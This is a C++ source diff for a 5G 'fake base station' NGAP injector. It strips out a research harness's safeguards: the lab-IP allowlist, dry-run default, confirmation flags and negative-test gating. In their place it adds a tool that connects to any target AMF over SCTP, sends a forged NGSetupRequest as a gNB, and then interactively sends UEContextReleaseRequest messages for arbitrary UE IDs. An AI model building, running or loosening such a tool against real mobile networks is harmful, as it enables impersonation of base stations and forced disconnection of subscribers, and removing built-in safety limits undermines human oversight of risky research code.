@@ -1,187 +1,442 @@
 // UHM WINGS Fake Base Station Research
 
 #include "CLI/CLI11.hpp"
-#include "config.h"
-#include "negative_tests.h"
-#include "ngap_decoder.h"
-#include "pcap_parser.h"
-#include "sctp_transport.h"
-#include "sniffer.h"
-#include "ocudu/adt/span.h"
+#include "lib/gateways/sctp_network_gateway_common_impl.h"
+#include "lib/ngap/ngap_asn1_helpers.h"
+#include "ocudu/asn1/asn1_utils.h"
+#include "ocudu/asn1/ngap/common.h"
+#include "ocudu/cu_cp/cu_cp_types.h"
+#include "ocudu/gateways/sctp_network_gateway.h"
+#include "ocudu/gateways/sctp_socket.h"
+#include "ocudu/ngap/ngap_context.h"
+#include "ocudu/ngap/ngap_message.h"
 #include "ocudu/ocudulog/ocudulog.h"
+#include "ocudu/ran/cause/ngap_cause.h"
+#include "ocudu/ran/plmn_identity.h"
+#include "ocudu/support/io/sockets.h"
+#include <algorithm>
+#include <arpa/inet.h>
+#include <array>
+#include <cerrno>
+#include <chrono>
 #include <cstdio>
 #include <cstdlib>
+#include <cstdint>
+#include <cstring>
+#include <iostream>
+#include <netdb.h>
+#include <netinet/sctp.h>
+#include <optional>
+#include <sstream>
 #include <stdexcept>
+#include <string>
+#include <sys/socket.h>
+#include <thread>
+#include <vector>
 
-using namespace ocudu::fbs;
+using namespace ocudu;
+using namespace ocudu::ocucp;
 
 namespace {
 
-struct command_selection {
-  harness_mode mode = harness_mode::passive_sniff;
-  std::string  negative_case;
+static constexpr unsigned stream_no                 = 0;
+static constexpr size_t   network_gateway_sctp_mtu = 9100;
+static constexpr uint64_t  max_amf_ue_ngap_id       = 1099511627775ULL;
+static constexpr uint64_t  max_ran_ue_ngap_id       = 4294967295ULL;
+
+struct probe_config {
+  std::vector<std::string> amf_addresses;
+  int                      amf_port              = NGAP_PORT;
+  std::vector<std::string> bind_addresses;
+  std::string              bind_interface        = "auto";
+  int                      init_max_attempts     = 2;
+  int                      max_init_timeo_ms     = 1000;
+  int                      post_send_wait_ms     = 100;
+  bool                     dump_pdu_hex          = true;
 };
 
-void add_common_options(CLI::App& cmd, runtime_options& opts)
-{
-  cmd.add_option("--config", opts.config_path, "Path to NGAP injector YAML config")->required();
-  cmd.add_flag("--lab-override", opts.lab_override, "Allow a non-private AMF IP only for an explicitly enclosed lab");
-  cmd.add_option("--lab-override-confirm",
-                 opts.lab_override_confirm,
-                 std::string("Required confirmation string for --lab-override: ") + lab_override_confirmation);
-}
+struct ue_ngap_ids {
+  uint64_t amf_ue_ngap_id;
+  uint64_t ran_ue_ngap_id;
+};
 
-void add_send_options(CLI::App& cmd, runtime_options& opts)
+static byte_buffer build_ng_setup_request()
 {
-  cmd.add_flag("--dry-run", opts.dry_run_explicit, "Summarize without sending; this is the default for send modes");
-  cmd.add_flag("--confirm-send", opts.confirm_send, "Actually transmit one bounded lab message");
-}
+  ngap_context_t ngap_ctxt = {{411, 22},
+                              "ocucp01",
+                              "AMF",
+                              amf_index_t::min,
+                              {{7, {{plmn_identity::test_value(), {{slice_service_type{1}}}}}}},
+                              {},
+                              256};
 
-void finalize_dry_run(runtime_options& opts)
-{
-  opts.dry_run = true;
-  if (opts.confirm_send && !opts.dry_run_explicit) {
-    opts.dry_run = false;
+  ngap_message ngap_msg = {};
+  ngap_msg.pdu.set_init_msg();
+  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_NG_SETUP);
+  fill_asn1_ng_setup_request(ngap_msg.pdu.init_msg().value.ng_setup_request(), ngap_ctxt);
+
+  byte_buffer   packed_pdu{byte_buffer::fallback_allocation_tag{}};
+  asn1::bit_ref bref(packed_pdu);
+  if (ngap_msg.pdu.pack(bref) != asn1::OCUDUASN_SUCCESS) {
+    throw std::runtime_error("Failed to pack NGSetupRequest");
   }
+
+  return packed_pdu;
 }
 
-std::string configured_pcap_path(const injector_config& cfg, const runtime_options& opts)
+static byte_buffer build_ue_context_release_request(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id)
 {
-  if (!opts.pcap_path.empty()) {
-    return opts.pcap_path;
+  cu_cp_ue_context_release_request release_request = {};
+  release_request.cause = ngap_cause_radio_network_t::release_due_to_ngran_generated_reason;
+
+  ngap_message ngap_msg = {};
+  ngap_msg.pdu.set_init_msg();
+  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RELEASE_REQUEST);
+
+  auto& asn1_request            = ngap_msg.pdu.init_msg().value.ue_context_release_request();
+  asn1_request->amf_ue_ngap_id = amf_ue_ngap_id;
+  asn1_request->ran_ue_ngap_id = ran_ue_ngap_id;
+  fill_asn1_ue_context_release_request(asn1_request, release_request);
+
+  byte_buffer   packed_pdu{byte_buffer::fallback_allocation_tag{}};
+  asn1::bit_ref bref(packed_pdu);
+  if (ngap_msg.pdu.pack(bref) != asn1::OCUDUASN_SUCCESS) {
+    throw std::runtime_error("Failed to pack UEContextReleaseRequest");
   }
-  if (cfg.pcap_path) {
-    return *cfg.pcap_path;
-  }
-  throw std::runtime_error("No PCAP path provided by --pcap or config pcap_path");
+
+  return packed_pdu;
 }
 
-void print_decoded_packets(const std::vector<ngap_pcap_packet>& packets)
+static std::string join_strings(const std::vector<std::string>& values, const char* separator)
 {
-  std::printf("pcap_ngap_packets count=%zu\n", packets.size());
-  for (const auto& packet : packets) {
-    const auto summary = decode_ngap_payload(packet.payload);
-    std::printf("pcap_ngap index=%u packet=%u src=%s:%u dst=%s:%u %s\n",
-                packet.ngap_index,
-                packet.packet_index,
-                packet.source_ip.c_str(),
-                packet.source_port,
-                packet.destination_ip.c_str(),
-                packet.destination_port,
-                format_summary(summary).c_str());
+  std::string result;
+  for (unsigned i = 0; i != values.size(); ++i) {
+    if (i != 0) {
+      result += separator;
+    }
+    result += values[i];
   }
+  return result;
 }
 
-const ngap_pcap_packet& select_setup_request_packet(const std::vector<ngap_pcap_packet>& packets,
-                                                    const runtime_options& opts)
+static std::string sockaddr_to_string(const sockaddr& addr, socklen_t addr_len)
 {
-  for (const auto& packet : packets) {
-    if (opts.selected_message_index_set && packet.ngap_index != opts.selected_message_index) {
+  const auto info = get_nameinfo(addr, addr_len);
+  return info.address + ":" + std::to_string(info.port);
+}
+
+static socklen_t sockaddr_len(const sockaddr_storage& addr)
+{
+  return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET ? sizeof(sockaddr_in) : sizeof(sockaddr_in6);
+}
+
+static std::vector<sockaddr_storage>
+resolve_sctp_addresses(const std::vector<std::string>& addresses, int port, ocudulog::basic_logger& logger)
+{
+  std::vector<sockaddr_storage> resolved_addrs;
+  for (const auto& addr : addresses) {
+    sockaddr_searcher searcher{addr, port, logger};
+    for (struct addrinfo* result = searcher.next(); result != nullptr; result = searcher.next()) {
+      sockaddr_storage storage = {};
+      std::memcpy(&storage, result->ai_addr, result->ai_addrlen);
+      resolved_addrs.emplace_back(storage);
+    }
+  }
+
+  std::sort(resolved_addrs.begin(), resolved_addrs.end(), sockaddr_storage_less{});
+  auto last = std::unique(resolved_addrs.begin(), resolved_addrs.end(), sockaddr_storage_equal);
+  resolved_addrs.erase(last, resolved_addrs.end());
+  return resolved_addrs;
+}
+
+static bool has_ipv6_address(const std::vector<sockaddr_storage>& addresses)
+{
+  return std::any_of(addresses.begin(), addresses.end(), [](const sockaddr_storage& addr) {
+    return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET6;
+  });
+}
+
+static void keep_compatible_destinations(std::vector<sockaddr_storage>& destinations, int socket_family)
+{
+  if (socket_family != AF_INET) {
+    return;
+  }
+  destinations.erase(std::remove_if(destinations.begin(),
+                                    destinations.end(),
+                                    [](const sockaddr_storage& addr) {
+                                      return reinterpret_cast<const sockaddr*>(&addr)->sa_family == AF_INET6;
+                                    }),
+                     destinations.end());
+}
+
+static std::vector<std::string> get_peer_addresses(int fd, sctp_assoc_t assoc_id)
+{
+  std::vector<std::string> peer_addresses;
+  struct sockaddr*        paddrs = nullptr;
+
+  const int paddr_count = ::sctp_getpaddrs(fd, assoc_id, &paddrs);
+  if (paddr_count <= 0 || paddrs == nullptr) {
+    return peer_addresses;
+  }
+
+  const sockaddr* current = paddrs;
+  for (int i = 0; i != paddr_count; ++i) {
+    if (current->sa_family != AF_INET && current->sa_family != AF_INET6) {
+      break;
+    }
+    const socklen_t peer_len = current->sa_family == AF_INET ? sizeof(sockaddr_in) : sizeof(sockaddr_in6);
+    peer_addresses.push_back(sockaddr_to_string(*current, peer_len));
+    current = reinterpret_cast<const sockaddr*>(reinterpret_cast<const uint8_t*>(current) + peer_len);
+  }
+  ::sctp_freepaddrs(paddrs);
+
+  return peer_addresses;
+}
+
+static std::string get_local_endpoint(int fd)
+{
+  sockaddr_storage local_addr     = {};
+  socklen_t        local_addr_len = sizeof(local_addr);
+  if (::getsockname(fd, reinterpret_cast<sockaddr*>(&local_addr), &local_addr_len) != 0) {
+    return "unknown";
+  }
+  return sockaddr_to_string(*reinterpret_cast<sockaddr*>(&local_addr), local_addr_len);
+}
+
+static void dump_hex(const byte_buffer& pdu)
+{
+  for (uint8_t byte : pdu) {
+    std::printf("%02x", byte);
+  }
+  std::printf("\n");
+}
+
+static bool parse_uint64(const std::string& token, uint64_t& value)
+{
+  if (token.empty()) {
+    return false;
+  }
+
+  char* end = nullptr;
+  errno     = 0;
+  const auto parsed = std::strtoull(token.c_str(), &end, 0);
+  if (errno != 0 || end == token.c_str() || *end != '\0') {
+    return false;
+  }
+
+  value = static_cast<uint64_t>(parsed);
+  return true;
+}
+
+static std::optional<ue_ngap_ids> read_ue_ngap_ids()
+{
+  while (true) {
+    std::printf("Enter AMF-UE-NGAP-ID and RAN-UE-NGAP-ID, or q to quit: ");
+    std::fflush(stdout);
+
+    std::string line;
+    if (!std::getline(std::cin, line)) {
+      return std::nullopt;
+    }
+
+    if (line == "q" || line == "quit" || line == "exit") {
+      return std::nullopt;
+    }
+
+    std::stringstream input(line);
+    std::string       amf_token;
+    std::string       ran_token;
+    std::string       extra_token;
+    if (!(input >> amf_token >> ran_token) || (input >> extra_token)) {
+      std::printf("Expected exactly two IDs, for example: 1 1 or 0x1 0x1\n");
       continue;
     }
-    const auto summary = decode_ngap_payload(packet.payload);
-    if (is_ng_setup_request(summary)) {
-      return packet;
+
+    ue_ngap_ids ids = {};
+    if (!parse_uint64(amf_token, ids.amf_ue_ngap_id) || ids.amf_ue_ngap_id > max_amf_ue_ngap_id) {
+      std::printf("Invalid AMF-UE-NGAP-ID. Valid range is 0..%llu\n",
+                  static_cast<unsigned long long>(max_amf_ue_ngap_id));
+      continue;
+    }
+    if (!parse_uint64(ran_token, ids.ran_ue_ngap_id) || ids.ran_ue_ngap_id > max_ran_ue_ngap_id) {
+      std::printf("Invalid RAN-UE-NGAP-ID. Valid range is 0..%llu\n",
+                  static_cast<unsigned long long>(max_ran_ue_ngap_id));
+      continue;
+    }
+
+    return ids;
+  }
+}
+
+static void send_ngap_pdu(sctp_socket&            socket,
+                          sockaddr_storage&       destination,
+                          const byte_buffer&      pdu,
+                          const char*             pdu_name,
+                          const probe_config&     cfg)
+{
+  std::printf("NGAP injector: packed %s length=%zu bytes\n", pdu_name, static_cast<size_t>(pdu.length()));
+  if (cfg.dump_pdu_hex) {
+    std::printf("NGAP injector: packed %s hex=", pdu_name);
+    dump_hex(pdu);
+  }
+
+  if (pdu.length() > network_gateway_sctp_mtu) {
+    throw std::runtime_error(std::string("Packed ") + pdu_name + " exceeds SCTP gateway maximum PDU length");
+  }
+
+  std::array<uint8_t, network_gateway_sctp_mtu> send_buffer = {};
+  span<const uint8_t>                            pdu_span    = to_span(pdu, send_buffer);
+  const int bytes_sent = ::sctp_sendmsg(socket.fd().value(),
+                                        pdu_span.data(),
+                                        pdu_span.size(),
+                                        reinterpret_cast<sockaddr*>(&destination),
+                                        sockaddr_len(destination),
+                                        htonl(NGAP_PPID),
+                                        0,
+                                        stream_no,
+                                        0,
+                                        0);
+  if (bytes_sent < 0) {
+    throw std::runtime_error(std::string("Failed to send ") + pdu_name + ": " + std::strerror(errno));
+  }
+  if (static_cast<size_t>(bytes_sent) != pdu.length()) {
+    throw std::runtime_error(std::string("Partial ") + pdu_name + " send");
+  }
+
+  std::printf("NGAP injector: sent %s bytes=%d/%zu\n", pdu_name, bytes_sent, static_cast<size_t>(pdu.length()));
+}
+
+static probe_config parse_args(int argc, char** argv)
+{
+  probe_config cfg;
+  CLI::App     app{"Send NG Setup Request and interactive UE Context Release Request packets to a target AMF over SCTP"};
+
+  app.add_option("--amf-addr,--target", cfg.amf_addresses, "Target AMF address or hostname")
+      ->required()
+      ->expected(1, -1);
+  app.add_option("--amf-port,--port", cfg.amf_port, "Target AMF SCTP port")->capture_default_str();
+  app.add_option("--bind-addr", cfg.bind_addresses, "Local SCTP bind address")->expected(1, -1);
+  app.add_option("--bind-interface", cfg.bind_interface, "Local interface for SO_BINDTODEVICE")->capture_default_str();
+  app.add_option("--sctp-init-max-attempts", cfg.init_max_attempts, "SCTP INIT max attempts")
+      ->capture_default_str();
+  app.add_option("--sctp-max-init-timeo-ms", cfg.max_init_timeo_ms, "SCTP INIT max timeout in milliseconds")
+      ->capture_default_str();
+  app.add_option("--post-send-wait-ms", cfg.post_send_wait_ms, "Delay after NGSetupRequest before interactive input")
+      ->capture_default_str();
+  app.add_flag_function("--no-hex", [&cfg](std::int64_t) { cfg.dump_pdu_hex = false; },
+                        "Do not print the packed NGAP PDU hex dump");
+
+  try {
+    app.parse(argc, argv);
+  } catch (const CLI::ParseError& e) {
+    std::exit(app.exit(e));
+  }
+
+  return cfg;
+}
+
+static int run_probe(const probe_config& cfg)
+{
+  auto& logger = ocudulog::fetch_basic_logger("SCTP-GW");
+
+  const byte_buffer ng_setup_request = build_ng_setup_request();
+  std::printf("NGAP injector: target=[%s]:%d bind=[%s] bind_interface=%s ppid=%u stream=%u\n",
+              join_strings(cfg.amf_addresses, ", ").c_str(),
+              cfg.amf_port,
+              cfg.bind_addresses.empty() ? "implicit" : join_strings(cfg.bind_addresses, ", ").c_str(),
+              cfg.bind_interface.c_str(),
+              NGAP_PPID,
+              stream_no);
+
+  std::vector<sockaddr_storage> dest_addrs = resolve_sctp_addresses(cfg.amf_addresses, cfg.amf_port, logger);
+  if (dest_addrs.empty()) {
+    throw std::runtime_error("Failed to resolve any target AMF address");
+  }
+
+  std::vector<sockaddr_storage> bind_addrs;
+  if (!cfg.bind_addresses.empty()) {
+    bind_addrs = resolve_sctp_addresses(cfg.bind_addresses, 0, logger);
+    if (bind_addrs.empty()) {
+      throw std::runtime_error("Failed to resolve any local bind address");
     }
   }
-  if (opts.selected_message_index_set) {
-    throw std::runtime_error("Selected PCAP message index is not an NG Setup Request");
-  }
-  throw std::runtime_error("No NG Setup Request found in PCAP");
-}
 
-byte_buffer byte_buffer_from_payload(const std::vector<uint8_t>& payload)
-{
-  byte_buffer buf{byte_buffer::fallback_allocation_tag{}};
-  if (!payload.empty() && !buf.append(ocudu::span<const uint8_t>(payload.data(), payload.size()))) {
-    throw std::runtime_error("Failed to allocate NGAP payload buffer");
-  }
-  return buf;
-}
-
-void run_decode_pcap(const runtime_options& opts)
-{
-  injector_config cfg = load_injector_config(opts.config_path);
-  validate_config_for_mode(cfg, opts, harness_mode::decode_only);
-  print_run_banner(cfg, opts, harness_mode::decode_only, false);
-
-  const auto packets = read_ngap_packets_from_pcap(configured_pcap_path(cfg, opts));
-  print_decoded_packets(packets);
-}
-
-void run_setup_replay(const runtime_options& opts)
-{
-  injector_config cfg = load_injector_config(opts.config_path);
-  validate_config_for_mode(cfg, opts, harness_mode::setup_replay);
-  print_run_banner(cfg, opts, harness_mode::setup_replay, !opts.dry_run);
-
-  const auto packets = read_ngap_packets_from_pcap(configured_pcap_path(cfg, opts));
-  print_decoded_packets(packets);
-  const ngap_pcap_packet& selected = select_setup_request_packet(packets, opts);
-  if (!packet_endpoints_are_configured_lab_ips(selected, cfg.local_gnb_ip, cfg.amf_ip, cfg.allowlisted_amf_ips)) {
-    throw std::runtime_error("Refusing replay: selected PCAP packet endpoints are not configured lab IPs");
+  const int socket_family = !bind_addrs.empty() ? (has_ipv6_address(bind_addrs) ? AF_INET6 : AF_INET)
+                                                : (has_ipv6_address(dest_addrs) ? AF_INET6 : AF_INET);
+  keep_compatible_destinations(dest_addrs, socket_family);
+  if (dest_addrs.empty()) {
+    throw std::runtime_error("No target AMF address is compatible with the selected SCTP socket family");
   }
 
-  const byte_buffer setup_payload = byte_buffer_from_payload(selected.payload);
-  std::printf("setup_replay selected_ngap_index=%u %s\n",
-              selected.ngap_index,
-              format_summary(decode_ngap_payload(setup_payload)).c_str());
-  if (opts.dry_run) {
-    std::printf("setup_replay send_status=not_sent reason=dry_run\n");
-    return;
+  sctp_socket_params params = {};
+  params.if_name           = "N2-PROBE";
+  params.ai_family         = socket_family;
+  params.ai_socktype       = SOCK_SEQPACKET;
+  params.init_max_attempts = cfg.init_max_attempts;
+  params.max_init_timeo    = std::chrono::milliseconds{cfg.max_init_timeo_ms};
+  params.nodelay           = true;
+
+  expected<sctp_socket> socket_outcome = sctp_socket::create(params);
+  if (!socket_outcome.has_value()) {
+    throw std::runtime_error("Failed to create SCTP socket");
+  }
+  sctp_socket socket = std::move(socket_outcome.value());
+
+  if (!bind_addrs.empty() && !socket.bindx(bind_addrs, cfg.bind_interface)) {
+    throw std::runtime_error("Failed to bind SCTP socket");
   }
 
-  auto result = run_setup_exchange(cfg, setup_payload, 5000);
-  std::printf("setup_replay result_state=%s response=\"%s\"\n",
-              to_string(result.state),
-              format_summary(result.response_summary).c_str());
-}
-
-void run_setup_construct(const runtime_options& opts)
-{
-  injector_config cfg = load_injector_config(opts.config_path);
-  validate_config_for_mode(cfg, opts, harness_mode::setup_construct);
-  print_run_banner(cfg, opts, harness_mode::setup_construct, !opts.dry_run);
-
-  const byte_buffer setup_payload = build_ng_setup_request(cfg);
-  std::printf("setup_construct payload_summary=\"%s\"\n", format_summary(decode_ngap_payload(setup_payload)).c_str());
-  if (opts.dry_run) {
-    std::printf("setup_construct send_status=not_sent reason=dry_run\n");
-    return;
+  sctp_assoc_t assoc_id = 0;
+  std::printf("NGAP injector: connecting to %zu resolved AMF address(es)...\n", dest_addrs.size());
+  if (!socket.connectx(dest_addrs, assoc_id) || assoc_id == 0) {
+    throw std::runtime_error(std::string("Failed to connect SCTP association: ") + std::strerror(errno));
   }
 
-  auto result = run_setup_exchange(cfg, setup_payload, 5000);
-  std::printf("setup_construct result_state=%s response=\"%s\"\n",
-              to_string(result.state),
-              format_summary(result.response_summary).c_str());
-}
+  const auto bound_port     = socket.get_bound_port();
+  const auto peer_addresses = get_peer_addresses(socket.fd().value(), assoc_id);
+  std::printf("NGAP injector: SCTP connected fd=%d assoc_id=%d local=%s local_port=%s peer=[%s]\n",
+              socket.fd().value(),
+              static_cast<int>(assoc_id),
+              get_local_endpoint(socket.fd().value()).c_str(),
+              bound_port.has_value() ? std::to_string(bound_port.value()).c_str() : "unknown",
+              peer_addresses.empty() ? "unknown" : join_strings(peer_addresses, ", ").c_str());
 
-void run_passive_sniff(const runtime_options& opts)
-{
-  injector_config cfg = load_injector_config(opts.config_path);
-  validate_config_for_mode(cfg, opts, harness_mode::passive_sniff);
-  print_run_banner(cfg, opts, harness_mode::passive_sniff, false);
-  (void)run_passive_sniffer(cfg, opts.max_packets, opts.duration_seconds, opts.export_context_path);
-}
+  send_ngap_pdu(socket, dest_addrs.front(), ng_setup_request, "NGSetupRequest", cfg);
 
-void run_negative_case(const runtime_options& opts, const std::string& negative_case)
-{
-  injector_config cfg = load_injector_config(opts.config_path);
-  print_run_banner(cfg, opts, harness_mode::negative_test, !opts.dry_run);
+  if (cfg.post_send_wait_ms > 0) {
+    std::this_thread::sleep_for(std::chrono::milliseconds{cfg.post_send_wait_ms});
+  }
 
-  if (negative_case == "ue-context-release") {
-    run_negative_ue_context_release(cfg, opts);
-    return;
+  std::printf("NGAP injector: SCTP association remains open for interactive UEContextReleaseRequest sends\n");
+  while (true) {
+    const auto ids = read_ue_ngap_ids();
+    if (!ids.has_value()) {
+      break;
+    }
+
+    const byte_buffer release_request = build_ue_context_release_request(ids->amf_ue_ngap_id, ids->ran_ue_ngap_id);
+    send_ngap_pdu(socket, dest_addrs.front(), release_request, "UEContextReleaseRequest", cfg);
   }
-  if (negative_case == "gnb-control") {
-    run_negative_gnb_control(cfg, opts);
-    return;
+
+  const int eof_result =
+      ::sctp_sendmsg(socket.fd().value(),
+                     nullptr,
+                     0,
+                     reinterpret_cast<sockaddr*>(&dest_addrs.front()),
+                     sockaddr_len(dest_addrs.front()),
+                     htonl(NGAP_PPID),
+                     SCTP_EOF,
+                     stream_no,
+                     0,
+                     0);
+  if (eof_result < 0) {
+    std::printf("NGAP injector: warning: failed to send SCTP EOF during close: %s\n", std::strerror(errno));
+  } else {
+    std::printf("NGAP injector: sent SCTP EOF and closing socket\n");
   }
-  if (negative_case == "malformed") {
-    run_negative_malformed_stub(cfg, opts);
-    return;
-  }
-  throw std::runtime_error("Unknown negative-test case: " + negative_case);
+
+  socket.close();
+  return 0;
 }
 
 } // namespace
@@ -190,97 +445,12 @@ int main(int argc, char** argv)
 {
   ocudulog::init();
 
-  runtime_options  opts;
-  command_selection selected;
-
-  CLI::App app{"Controlled NGAP research injector/test harness for enclosed 5G SA labs"};
-  app.require_subcommand(1);
-
-  auto* passive = app.add_subcommand("passive-sniff", "Passively sniff local allowlisted N2 interface traffic");
-  add_common_options(*passive, opts);
-  passive->add_option("--export-context", opts.export_context_path, "Export observed UE context identifiers to JSON");
-  passive->add_option("--max-packets", opts.max_packets, "Stop after this many decoded NGAP packets");
-  passive->add_option("--duration-sec", opts.duration_seconds, "Stop after this many seconds");
-  passive->callback([&selected]() { selected.mode = harness_mode::passive_sniff; });
-
-  auto* decode = app.add_subcommand("decode-pcap", "Decode SCTP/NGAP payloads from a lab PCAP/PCAPNG");
-  add_common_options(*decode, opts);
-  decode->add_option("--pcap", opts.pcap_path, "PCAP/PCAPNG file to decode");
-  decode->callback([&selected]() { selected.mode = harness_mode::decode_only; });
-
-  auto* setup_replay = app.add_subcommand("setup-replay", "Replay an NG Setup Request from a lab PCAP");
-  add_common_options(*setup_replay, opts);
-  add_send_options(*setup_replay, opts);
-  setup_replay->add_option("--pcap", opts.pcap_path, "PCAP/PCAPNG containing known-good NG setup messages");
-  setup_replay
-      ->add_option("--message-index", opts.selected_message_index, "Decoded NGAP packet index to replay")
-      ->each([&opts](const std::string&) { opts.selected_message_index_set = true; });
-  setup_replay->callback([&selected]() { selected.mode = harness_mode::setup_replay; });
-
-  auto* setup_construct = app.add_subcommand("setup-construct", "Construct a minimal configured NG Setup Request");
-  add_common_options(*setup_construct, opts);
-  add_send_options(*setup_construct, opts);
-  setup_construct->callback([&selected]() { selected.mode = harness_mode::setup_construct; });
-
-  auto* negative = app.add_subcommand("negative-test", "Explicitly gated controlled negative tests");
-  negative->require_subcommand(1);
-
-  auto* ue_release = negative->add_subcommand("ue-context-release", "UE context release behavior validation");
-  add_common_options(*ue_release, opts);
-  add_send_options(*ue_release, opts);
-  ue_release->add_flag("--enable-negative-tests", opts.enable_negative_tests, "Enable negative-test send path");
-  ue_release->add_option("--context", opts.context_path, "Observed context JSON from passive-sniff");
-  ue_release->add_option("--pcap", opts.pcap_path, "Optional lab PCAP containing a release-related NGAP message");
-  ue_release->callback([&selected]() {
-    selected.mode          = harness_mode::negative_test;
-    selected.negative_case = "ue-context-release";
-  });
-
-  auto* gnb_control = negative->add_subcommand("gnb-control", "gNB-side NGAP control behavior validation");
-  add_common_options(*gnb_control, opts);
-  add_send_options(*gnb_control, opts);
-  gnb_control->add_flag("--enable-negative-tests", opts.enable_negative_tests, "Enable negative-test send path");
-  gnb_control->callback([&selected]() {
-    selected.mode          = harness_mode::negative_test;
-    selected.negative_case = "gnb-control";
-  });
-
-  auto* malformed = negative->add_subcommand("malformed", "Malformed/unexpected message handling stub");
-  add_common_options(*malformed, opts);
-  add_send_options(*malformed, opts);
-  malformed->add_flag("--enable-negative-tests", opts.enable_negative_tests, "Enable negative-test send path");
-  malformed->callback([&selected]() {
-    selected.mode          = harness_mode::negative_test;
-    selected.negative_case = "malformed";
-  });
-
   try {
-    app.parse(argc, argv);
-    finalize_dry_run(opts);
-
-    switch (selected.mode) {
-      case harness_mode::passive_sniff:
-        run_passive_sniff(opts);
-        break;
-      case harness_mode::decode_only:
-        run_decode_pcap(opts);
-        break;
-      case harness_mode::setup_replay:
-        run_setup_replay(opts);
-        break;
-      case harness_mode::setup_construct:
-        run_setup_construct(opts);
-        break;
-      case harness_mode::negative_test:
-        run_negative_case(opts, selected.negative_case);
-        break;
-    }
-  } catch (const CLI::ParseError& e) {
-    return app.exit(e);
+    return run_probe(parse_args(argc, argv));
   } catch (const std::exception& e) {
     std::fprintf(stderr, "ngap_injector error: %s\n", e.what());
-    return EXIT_FAILURE;
+    return 1;
   }
 
-  return EXIT_SUCCESS;
+  return 0;
 }
